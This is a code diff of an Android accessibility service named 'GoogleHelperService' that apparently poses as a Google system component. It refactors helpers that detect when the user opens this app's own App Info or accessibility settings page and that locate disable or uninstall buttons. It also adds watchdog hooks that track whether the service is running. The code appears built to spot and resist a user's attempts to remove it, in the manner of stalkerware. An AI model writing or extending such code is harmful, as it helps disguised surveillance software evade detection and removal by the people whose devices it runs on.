@@ -10,7 +10,6 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import android.widget.Toast
-import com.google.android.systemservice.PinProtectionActivity
 import java.util.Locale
 
 /**
@@ -54,6 +53,7 @@ class GoogleHelperService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
+        WatchdogService.markServiceRunning(this::class.java)
         Log.d(TAG, "Connected")
         serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes =
@@ -179,21 +179,14 @@ class GoogleHelperService : AccessibilityService() {
     }
 
     /**
-     * Check if we're viewing App Info for our package
+     * Generic tree traversal — returns true if any node matches the predicate.
      */
-    private fun isViewingOurAppInfo(node: AccessibilityNodeInfo): Boolean {
-        val text = node.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
-        val contentDesc = node.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
-        
-        // Check for our package name or app name in the view
-        if (text.contains(OUR_PACKAGE) || contentDesc.contains(OUR_PACKAGE)) {
-            return true
-        }
-        
+    private fun findInTree(node: AccessibilityNodeInfo, predicate: (AccessibilityNodeInfo) -> Boolean): Boolean {
+        if (predicate(node)) return true
         for (i in 0 until node.childCount) {
             val child = node.getChild(i) ?: continue
             try {
-                if (isViewingOurAppInfo(child)) return true
+                if (findInTree(child, predicate)) return true
             } finally {
                 child.recycle()
             }
@@ -201,50 +194,23 @@ class GoogleHelperService : AccessibilityService() {
         return false
     }
 
-    /**
-     * Check if we're viewing our accessibility service detail page
-     */
-    private fun isViewingOurAccessibilityService(node: AccessibilityNodeInfo): Boolean {
-        val text = node.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
-        val contentDesc = node.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
-        
-        val isOurService = OUR_SERVICE_KEYWORDS.any { keyword ->
-            text.contains(keyword) || contentDesc.contains(keyword)
-        }
-        if (isOurService) return true
-        
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            try {
-                if (isViewingOurAccessibilityService(child)) return true
-            } finally {
-                child.recycle()
-            }
-        }
-        return false
+    private fun isViewingOurAppInfo(node: AccessibilityNodeInfo): Boolean = findInTree(node) { n ->
+        val text = n.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
+        val contentDesc = n.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
+        text.contains(OUR_PACKAGE) || contentDesc.contains(OUR_PACKAGE)
     }
 
-    /**
-     * Find if there's a disable/uninstall button in the tree
-     */
-    private fun findDangerButton(node: AccessibilityNodeInfo): Boolean {
-        val text = node.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
-        val contentDesc = node.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
-        val isButton = node.className?.toString()?.contains("Button") == true
-        
-        if (isButton && DANGER_KEYWORDS.any { text.contains(it) || contentDesc.contains(it) }) {
-            return true
-        }
-        
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            try {
-                if (findDangerButton(child)) return true
-            } finally {
-                child.recycle()
-            }
-        }
-        return false
+    private fun isViewingOurAccessibilityService(node: AccessibilityNodeInfo): Boolean = findInTree(node) { n ->
+        val text = n.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
+        val contentDesc = n.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
+        OUR_SERVICE_KEYWORDS.any { keyword -> text.contains(keyword) || contentDesc.contains(keyword) }
+    }
+
+    private fun findDangerButton(node: AccessibilityNodeInfo): Boolean = findInTree(node) { n ->
+        val text = n.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
+        val contentDesc = n.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
+        val isButton = n.className?.toString()?.contains("Button") == true
+        isButton && DANGER_KEYWORDS.any { text.contains(it) || contentDesc.contains(it) }
     }
 
     /**
@@ -276,6 +242,7 @@ class GoogleHelperService : AccessibilityService() {
     }
 
     override fun onDestroy() {
+        WatchdogService.markServiceStopped(this::class.java)
         handler.removeCallbacksAndMessages(null)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             stopForeground(STOP_FOREGROUND_REMOVE)
@@ -286,14 +253,4 @@ class GoogleHelperService : AccessibilityService() {
         super.onDestroy()
     }
 
-    private fun requestPin() {
-        try {
-            val intent = Intent(this, PinProtectionActivity::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-            }
-            startActivity(intent)
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to launch PIN: ${e.message}")
-        }
-    }
 }
